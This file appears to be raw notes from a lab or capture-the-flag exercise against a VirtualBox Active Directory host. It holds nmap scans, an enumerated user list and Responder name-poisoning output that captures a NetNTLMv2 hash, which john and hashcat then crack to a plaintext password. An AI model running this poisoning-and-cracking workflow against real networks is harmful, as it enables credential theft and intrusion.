@@ -1,0 +1,488 @@
+# Nmap 7.95 scan initiated Tue Apr 28 17:23:00 2026 as: /usr/lib/nmap/nmap --privileged -sS -p- --open --min-rate 5000 -Pn -n -oN scan.txt 192.168.56.100
+Nmap scan report for 192.168.56.100
+Host is up (0.00052s latency).
+Not shown: 65515 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49664/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+53729/tcp open  unknown
+61565/tcp open  unknown
+61572/tcp open  unknown
+61594/tcp open  unknown
+MAC Address: 08:00:27:96:A8:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+# Nmap done at Tue Apr 28 17:23:27 2026 -- 1 IP address (1 host up) scanned in 26.60 seconds
+
+
+
+
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+# Nmap 7.95 scan initiated Tue Apr 28 17:27:51 2026 as: /usr/lib/nmap/nmap --privileged -sVC -p135,139,3268,3269,389,445,464,49664,49669,49670,53,53729,593,5985,61565,61572,61594,636,88,9389 -vvv -n -Pn -oN fullscan.txt 192.168.56.100
+Nmap scan report for 192.168.56.100
+Host is up, received arp-response (0.00040s latency).
+Scanned at 2026-04-28 17:27:52 EDT for 94s
+
+PORT      STATE SERVICE       REASON          VERSION
+53/tcp    open  domain        syn-ack ttl 128 Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack ttl 128 Microsoft Windows Kerberos (server time: 2026-04-28 21:27:58Z)
+135/tcp   open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: PHANTOM.THL0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-04-28T21:29:26+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=DC01.PHANTOM.THL
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.PHANTOM.THL
+| Issuer: commonName=PHANTOM-DC01-CA/domainComponent=PHANTOM
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-02-21T23:24:38
+| Not valid after:  2027-02-21T23:24:38
+| MD5:   07c2:ecd2:edd8:cde3:893a:e7e8:060c:b129
+| SHA-1: 9533:e5ab:94d7:327a:7ce1:515a:c958:abf6:5c7b:771a
+| -----BEGIN CERTIFICATE-----
+| MIIF3zCCBMegAwIBAgITPwAAAAK5rJ9a+thSxQAAAAAAAjANBgkqhkiG9w0BAQsF
+| ADBIMRMwEQYKCZImiZPyLGQBGRYDVEhMMRcwFQYKCZImiZPyLGQBGRYHUEhBTlRP
+| TTEYMBYGA1UEAxMPUEhBTlRPTS1EQzAxLUNBMB4XDTI2MDIyMTIzMjQzOFoXDTI3
+| MDIyMTIzMjQzOFowGzEZMBcGA1UEAxMQREMwMS5QSEFOVE9NLlRITDCCASIwDQYJ
+| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAK94xPDvw0L6S0AabUBysbEFzt6mZnSP
+| 0P+JIeIkZXKRSFa9QzgLe8jyUmo8bLXb5/uPZ1uFV7egB+KSY+/DYfPC9nOMkKN3
+| 5XfemFa265xqb7cIaqrU+noCdDw/d/50Trc7Xa29QjP8BNNstuSOlJgUBw4LiNSN
+| WIjrI8kZt6NmAYaHxj1H3kCD71GBaexhKg6QOKUmokLxqbGeeKXJzA6H4v337Ap1
+| 5b85ffNSZUzRTtfe0FGDTaacqhjCxld4GQAK7bhf9c7k6Nmr/0v4gUYCAHq+1W+A
+| 06TKVXMr208qREX4Lakg+kzM8ZQNVvzDBYfZbuhYfS8GweW5IlDP0cECAwEAAaOC
+| Au0wggLpMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
+| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
+| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
+| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
+| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNsx4wKN
+| rUoAHs8eP/A5x53aofqXMB8GA1UdIwQYMBaAFGcV1O7SnA1XponaLrVHQns6skhc
+| MIHKBgNVHR8EgcIwgb8wgbyggbmggbaGgbNsZGFwOi8vL0NOPVBIQU5UT00tREMw
+| MS1DQSxDTj1EQzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxD
+| Tj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPVBIQU5UT00sREM9VEhMP2Nl
+| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0
+| cmlidXRpb25Qb2ludDCBwQYIKwYBBQUHAQEEgbQwgbEwga4GCCsGAQUFBzAChoGh
+| bGRhcDovLy9DTj1QSEFOVE9NLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtl
+| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9UEhB
+| TlRPTSxEQz1USEw/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp
+| ZmljYXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQfMoY
+| a0KSe02vrJogehLSUIIQREMwMS5QSEFOVE9NLlRITDANBgkqhkiG9w0BAQsFAAOC
+| AQEAr4xpXRtIJXpkmp4t7eT/aw5PPEkhVK3ENeYmLFvRSz6Ea0yRgVgSv7j5cAeV
+| 8EB6jN+ArkE+yRK3uX2AviPo4IeVE8ujODWdnXye9BCnDZWZDXXobwfqac2TFD6R
+| FXN0wXrKZDTcmOJ+PBqUyyRmah4Y0ffhU6RXy4FbmrFd+F4y6E2MLSu1sNIcdICK
+| 8/nkcUUHMY0EjAkYekGQTHdPuU0ZX7tkoiOItPKdfxRWq349TmIzi7yeW1GgiCGI
+| I9geE1guTrTCkuCHgCvvqEthjsFfH9zuiKr+RLrh+6uSdMKs15nmmnF907YjY14n
+| uym7IK6YR3FP4b+FTCvmiFcXgw==
+|_-----END CERTIFICATE-----
+445/tcp   open  microsoft-ds? syn-ack ttl 128
+464/tcp   open  kpasswd5?     syn-ack ttl 128
+593/tcp   open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: PHANTOM.THL0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-04-28T21:29:26+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=DC01.PHANTOM.THL
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.PHANTOM.THL
+| Issuer: commonName=PHANTOM-DC01-CA/domainComponent=PHANTOM
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-02-21T23:24:38
+| Not valid after:  2027-02-21T23:24:38
+| MD5:   07c2:ecd2:edd8:cde3:893a:e7e8:060c:b129
+| SHA-1: 9533:e5ab:94d7:327a:7ce1:515a:c958:abf6:5c7b:771a
+| -----BEGIN CERTIFICATE-----
+| MIIF3zCCBMegAwIBAgITPwAAAAK5rJ9a+thSxQAAAAAAAjANBgkqhkiG9w0BAQsF
+| ADBIMRMwEQYKCZImiZPyLGQBGRYDVEhMMRcwFQYKCZImiZPyLGQBGRYHUEhBTlRP
+| TTEYMBYGA1UEAxMPUEhBTlRPTS1EQzAxLUNBMB4XDTI2MDIyMTIzMjQzOFoXDTI3
+| MDIyMTIzMjQzOFowGzEZMBcGA1UEAxMQREMwMS5QSEFOVE9NLlRITDCCASIwDQYJ
+| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAK94xPDvw0L6S0AabUBysbEFzt6mZnSP
+| 0P+JIeIkZXKRSFa9QzgLe8jyUmo8bLXb5/uPZ1uFV7egB+KSY+/DYfPC9nOMkKN3
+| 5XfemFa265xqb7cIaqrU+noCdDw/d/50Trc7Xa29QjP8BNNstuSOlJgUBw4LiNSN
+| WIjrI8kZt6NmAYaHxj1H3kCD71GBaexhKg6QOKUmokLxqbGeeKXJzA6H4v337Ap1
+| 5b85ffNSZUzRTtfe0FGDTaacqhjCxld4GQAK7bhf9c7k6Nmr/0v4gUYCAHq+1W+A
+| 06TKVXMr208qREX4Lakg+kzM8ZQNVvzDBYfZbuhYfS8GweW5IlDP0cECAwEAAaOC
+| Au0wggLpMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
+| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
+| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
+| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
+| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNsx4wKN
+| rUoAHs8eP/A5x53aofqXMB8GA1UdIwQYMBaAFGcV1O7SnA1XponaLrVHQns6skhc
+| MIHKBgNVHR8EgcIwgb8wgbyggbmggbaGgbNsZGFwOi8vL0NOPVBIQU5UT00tREMw
+| MS1DQSxDTj1EQzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxD
+| Tj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPVBIQU5UT00sREM9VEhMP2Nl
+| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0
+| cmlidXRpb25Qb2ludDCBwQYIKwYBBQUHAQEEgbQwgbEwga4GCCsGAQUFBzAChoGh
+| bGRhcDovLy9DTj1QSEFOVE9NLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtl
+| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9UEhB
+| TlRPTSxEQz1USEw/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp
+| ZmljYXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQfMoY
+| a0KSe02vrJogehLSUIIQREMwMS5QSEFOVE9NLlRITDANBgkqhkiG9w0BAQsFAAOC
+| AQEAr4xpXRtIJXpkmp4t7eT/aw5PPEkhVK3ENeYmLFvRSz6Ea0yRgVgSv7j5cAeV
+| 8EB6jN+ArkE+yRK3uX2AviPo4IeVE8ujODWdnXye9BCnDZWZDXXobwfqac2TFD6R
+| FXN0wXrKZDTcmOJ+PBqUyyRmah4Y0ffhU6RXy4FbmrFd+F4y6E2MLSu1sNIcdICK
+| 8/nkcUUHMY0EjAkYekGQTHdPuU0ZX7tkoiOItPKdfxRWq349TmIzi7yeW1GgiCGI
+| I9geE1guTrTCkuCHgCvvqEthjsFfH9zuiKr+RLrh+6uSdMKs15nmmnF907YjY14n
+| uym7IK6YR3FP4b+FTCvmiFcXgw==
+|_-----END CERTIFICATE-----
+3268/tcp  open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: PHANTOM.THL0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.PHANTOM.THL
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.PHANTOM.THL
+| Issuer: commonName=PHANTOM-DC01-CA/domainComponent=PHANTOM
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-02-21T23:24:38
+| Not valid after:  2027-02-21T23:24:38
+| MD5:   07c2:ecd2:edd8:cde3:893a:e7e8:060c:b129
+| SHA-1: 9533:e5ab:94d7:327a:7ce1:515a:c958:abf6:5c7b:771a
+| -----BEGIN CERTIFICATE-----
+| MIIF3zCCBMegAwIBAgITPwAAAAK5rJ9a+thSxQAAAAAAAjANBgkqhkiG9w0BAQsF
+| ADBIMRMwEQYKCZImiZPyLGQBGRYDVEhMMRcwFQYKCZImiZPyLGQBGRYHUEhBTlRP
+| TTEYMBYGA1UEAxMPUEhBTlRPTS1EQzAxLUNBMB4XDTI2MDIyMTIzMjQzOFoXDTI3
+| MDIyMTIzMjQzOFowGzEZMBcGA1UEAxMQREMwMS5QSEFOVE9NLlRITDCCASIwDQYJ
+| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAK94xPDvw0L6S0AabUBysbEFzt6mZnSP
+| 0P+JIeIkZXKRSFa9QzgLe8jyUmo8bLXb5/uPZ1uFV7egB+KSY+/DYfPC9nOMkKN3
+| 5XfemFa265xqb7cIaqrU+noCdDw/d/50Trc7Xa29QjP8BNNstuSOlJgUBw4LiNSN
+| WIjrI8kZt6NmAYaHxj1H3kCD71GBaexhKg6QOKUmokLxqbGeeKXJzA6H4v337Ap1
+| 5b85ffNSZUzRTtfe0FGDTaacqhjCxld4GQAK7bhf9c7k6Nmr/0v4gUYCAHq+1W+A
+| 06TKVXMr208qREX4Lakg+kzM8ZQNVvzDBYfZbuhYfS8GweW5IlDP0cECAwEAAaOC
+| Au0wggLpMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
+| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
+| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
+| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
+| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNsx4wKN
+| rUoAHs8eP/A5x53aofqXMB8GA1UdIwQYMBaAFGcV1O7SnA1XponaLrVHQns6skhc
+| MIHKBgNVHR8EgcIwgb8wgbyggbmggbaGgbNsZGFwOi8vL0NOPVBIQU5UT00tREMw
+| MS1DQSxDTj1EQzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxD
+| Tj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPVBIQU5UT00sREM9VEhMP2Nl
+| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0
+| cmlidXRpb25Qb2ludDCBwQYIKwYBBQUHAQEEgbQwgbEwga4GCCsGAQUFBzAChoGh
+| bGRhcDovLy9DTj1QSEFOVE9NLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtl
+| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9UEhB
+| TlRPTSxEQz1USEw/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp
+| ZmljYXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQfMoY
+| a0KSe02vrJogehLSUIIQREMwMS5QSEFOVE9NLlRITDANBgkqhkiG9w0BAQsFAAOC
+| AQEAr4xpXRtIJXpkmp4t7eT/aw5PPEkhVK3ENeYmLFvRSz6Ea0yRgVgSv7j5cAeV
+| 8EB6jN+ArkE+yRK3uX2AviPo4IeVE8ujODWdnXye9BCnDZWZDXXobwfqac2TFD6R
+| FXN0wXrKZDTcmOJ+PBqUyyRmah4Y0ffhU6RXy4FbmrFd+F4y6E2MLSu1sNIcdICK
+| 8/nkcUUHMY0EjAkYekGQTHdPuU0ZX7tkoiOItPKdfxRWq349TmIzi7yeW1GgiCGI
+| I9geE1guTrTCkuCHgCvvqEthjsFfH9zuiKr+RLrh+6uSdMKs15nmmnF907YjY14n
+| uym7IK6YR3FP4b+FTCvmiFcXgw==
+|_-----END CERTIFICATE-----
+|_ssl-date: 2026-04-28T21:29:26+00:00; 0s from scanner time.
+3269/tcp  open  ssl/ldap      syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: PHANTOM.THL0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.PHANTOM.THL
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.PHANTOM.THL
+| Issuer: commonName=PHANTOM-DC01-CA/domainComponent=PHANTOM
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-02-21T23:24:38
+| Not valid after:  2027-02-21T23:24:38
+| MD5:   07c2:ecd2:edd8:cde3:893a:e7e8:060c:b129
+| SHA-1: 9533:e5ab:94d7:327a:7ce1:515a:c958:abf6:5c7b:771a
+| -----BEGIN CERTIFICATE-----
+| MIIF3zCCBMegAwIBAgITPwAAAAK5rJ9a+thSxQAAAAAAAjANBgkqhkiG9w0BAQsF
+| ADBIMRMwEQYKCZImiZPyLGQBGRYDVEhMMRcwFQYKCZImiZPyLGQBGRYHUEhBTlRP
+| TTEYMBYGA1UEAxMPUEhBTlRPTS1EQzAxLUNBMB4XDTI2MDIyMTIzMjQzOFoXDTI3
+| MDIyMTIzMjQzOFowGzEZMBcGA1UEAxMQREMwMS5QSEFOVE9NLlRITDCCASIwDQYJ
+| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAK94xPDvw0L6S0AabUBysbEFzt6mZnSP
+| 0P+JIeIkZXKRSFa9QzgLe8jyUmo8bLXb5/uPZ1uFV7egB+KSY+/DYfPC9nOMkKN3
+| 5XfemFa265xqb7cIaqrU+noCdDw/d/50Trc7Xa29QjP8BNNstuSOlJgUBw4LiNSN
+| WIjrI8kZt6NmAYaHxj1H3kCD71GBaexhKg6QOKUmokLxqbGeeKXJzA6H4v337Ap1
+| 5b85ffNSZUzRTtfe0FGDTaacqhjCxld4GQAK7bhf9c7k6Nmr/0v4gUYCAHq+1W+A
+| 06TKVXMr208qREX4Lakg+kzM8ZQNVvzDBYfZbuhYfS8GweW5IlDP0cECAwEAAaOC
+| Au0wggLpMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
+| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
+| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
+| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
+| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNsx4wKN
+| rUoAHs8eP/A5x53aofqXMB8GA1UdIwQYMBaAFGcV1O7SnA1XponaLrVHQns6skhc
+| MIHKBgNVHR8EgcIwgb8wgbyggbmggbaGgbNsZGFwOi8vL0NOPVBIQU5UT00tREMw
+| MS1DQSxDTj1EQzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxD
+| Tj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPVBIQU5UT00sREM9VEhMP2Nl
+| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0
+| cmlidXRpb25Qb2ludDCBwQYIKwYBBQUHAQEEgbQwgbEwga4GCCsGAQUFBzAChoGh
+| bGRhcDovLy9DTj1QSEFOVE9NLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtl
+| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9UEhB
+| TlRPTSxEQz1USEw/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp
+| ZmljYXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQfMoY
+| a0KSe02vrJogehLSUIIQREMwMS5QSEFOVE9NLlRITDANBgkqhkiG9w0BAQsFAAOC
+| AQEAr4xpXRtIJXpkmp4t7eT/aw5PPEkhVK3ENeYmLFvRSz6Ea0yRgVgSv7j5cAeV
+| 8EB6jN+ArkE+yRK3uX2AviPo4IeVE8ujODWdnXye9BCnDZWZDXXobwfqac2TFD6R
+| FXN0wXrKZDTcmOJ+PBqUyyRmah4Y0ffhU6RXy4FbmrFd+F4y6E2MLSu1sNIcdICK
+| 8/nkcUUHMY0EjAkYekGQTHdPuU0ZX7tkoiOItPKdfxRWq349TmIzi7yeW1GgiCGI
+| I9geE1guTrTCkuCHgCvvqEthjsFfH9zuiKr+RLrh+6uSdMKs15nmmnF907YjY14n
+| uym7IK6YR3FP4b+FTCvmiFcXgw==
+|_-----END CERTIFICATE-----
+|_ssl-date: 2026-04-28T21:29:26+00:00; 0s from scanner time.
+5985/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        syn-ack ttl 128 .NET Message Framing
+49664/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
+49669/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
+49670/tcp open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
+53729/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
+61565/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
+61572/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
+61594/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
+MAC Address: 08:00:27:96:A8:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:96:a8:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+| Names:
+|   DC01<00>             Flags: <unique><active>
+|   PHANTOM<1c>          Flags: <group><active>
+|   PHANTOM<00>          Flags: <group><active>
+|   DC01<20>             Flags: <unique><active>
+|   PHANTOM<1b>          Flags: <unique><active>
+| Statistics:
+|   08:00:27:96:a8:91:00:00:00:00:00:00:00:00:00:00:00
+|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
+|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 56320/tcp): CLEAN (Timeout)
+|   Check 2 (port 2672/tcp): CLEAN (Timeout)
+|   Check 3 (port 55790/udp): CLEAN (Timeout)
+|   Check 4 (port 57086/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2026-04-28T21:28:46
+|_  start_date: N/A
+|_clock-skew: mean: 0s, deviation: 0s, median: 0s
+
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Apr 28 17:29:26 2026 -- 1 IP address (1 host up) scanned in 94.75 seconds
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+Administrador
+Invitado
+krbtgt
+mark
+bob
+joe
+mia
+sandra
+maria
+ana
+michael
+ian
+joshua
+frank
+tomas
+robert
+LegacyAdmins
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+
+└─$ sudo responder -I eth0
+[sudo] password for kali: 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.6.0
+
+  To support this project:
+  Github -> https://github.com/sponsors/lgandx
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [eth0]
+    Responder IP               [192.168.56.7]
+    Responder IPv6             [fe80::1e40:ea6c:6e4b:d366]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+    Don't Respond To MDNS TLD  ['_DOSVC']
+    TTL for poisoned response  [default]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-49WSPB0UJKO]
+    Responder Domain Name      [OK9I.LOCAL]
+    Responder DCE-RPC Port     [49168]
+
+[+] Listening for events...                                                                                                                                 
+
+s[*] [MDNS] Poisoned answer sent to 192.168.56.100  for name PHANTOM.LOCAL
+[*] [NBT-NS] Poisoned answer sent to 192.168.56.100 for name PHANTOM (service: File Server)
+
+
+
+robert::PHANTOM.LOCAL:e27c7431a50d4e82:7189F5CF794954333497C5946A950936:010100000000000000E677F150F4DC01D8867018A6078BB200000000020008004F004B003900490001001E00570049004E002D00340039005700530050004200300055004A004B004F0004003400570049004E002D00340039005700530050004200300055004A004B004F002E004F004B00390049002E004C004F00430041004C00030014004F004B00390049002E004C004F00430041004C00050014004F004B00390049002E004C004F00430041004C000700080000E677F150F4DC010600040002000000080030003000000000000000000000000030000063DFF1CB5362335374881DD96658846D0F0B9425CBA322999519530EF1034DE60A001000000000000000000000000000000000000900240063006900660073002F005000480041004E0054004F004D002E004C004F00430041004C000000000000000000   
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+
+
+┌──(kali㉿kali)-[~/Documents/Phantom]
+└─$  john --wordlist=/usr/share/wordlists/rockyou.txt  hash_robert.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bLink182         (robert)     
+1g 0:00:00:05 DONE (2026-06-04 18:46) 0.1824g/s 1799Kp/s 1799Kc/s 1799KC/s bLueLove..b82508
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/Phantom]
+└─$ 
+
+
+
+
+
+
+
+
+┌──(kali㉿kali)-[~/Documents/Phantom]
+└─$ hashcat -m 5600 hash_robert.txt /usr/share/wordlists/rockyou.txt
+
+
+
+
+ROBERT::PHANTOM.LOCAL:e27c7431a50d4e82:7189f5cf794954333497c5946a950936:010100000000000000e677f150f4dc01d8867018a6078bb200000000020008004f004b003900490001001e00570049004e002d00340039005700530050004200300055004a004b004f0004003400570049004e002d00340039005700530050004200300055004a004b004f002e004f004b00390049002e004c004f00430041004c00030014004f004b00390049002e004c004f00430041004c00050014004f004b00390049002e004c004f00430041004c000700080000e677f150f4dc010600040002000000080030003000000000000000000000000030000063dff1cb5362335374881dd96658846d0f0b9425cba322999519530ef1034de60a001000000000000000000000000000000000000900240063006900660073002f005000480041004e0054004f004d002e004c004f00430041004c000000000000000000:bLink182
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: ROBERT::PHANTOM.LOCAL:e27c7431a50d4e82:7189f5cf7949...000000
+Time.Started.....: Thu Jun 11 11:11:36 2026 (11 secs)
+Time.Estimated...: Thu Jun 11 11:11:47 2026 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
